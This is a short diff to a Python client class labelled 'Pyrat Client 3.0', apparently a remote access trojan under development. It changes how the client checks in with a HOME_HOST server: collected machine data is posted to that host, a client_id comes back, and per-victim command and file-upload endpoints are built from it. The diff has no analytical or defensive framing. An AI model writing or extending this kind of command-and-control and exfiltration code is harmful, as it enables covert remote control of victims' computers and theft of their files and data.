@@ -52,9 +52,10 @@ class Client:
                 'User-Agent': 'Pyrat Client 3.0',
             },
         )
+        self.client_id = None
 
-        self.home_host = f'{HOME_HOST}{self.pc_uuid}/'
-        self.home_host_files = f'{HOME_HOST}{self.pc_uuid}/upload'
+        self.home_host = None
+        self.home_host_files = None
 
     def _get_country(self):
 
@@ -101,7 +102,13 @@ class Client:
 
         get_status = requests.post(HOME_HOST, json=self.user_data)
         status_message = get_status.json()['message']
+        self.client_id = get_status.json()['client_id']
+        self.home_host = f'{HOME_HOST}{self.client_id}/'
+        self.home_host_files = f'{HOME_HOST}{self.client_id}/upload'
         status_code = get_status.status_code
+        print(self.client_id)
+        print(self.home_host)
+        print(self.home_host_files)
         print(status_code, status_message)
         if status_code == 400:
             # Add raise
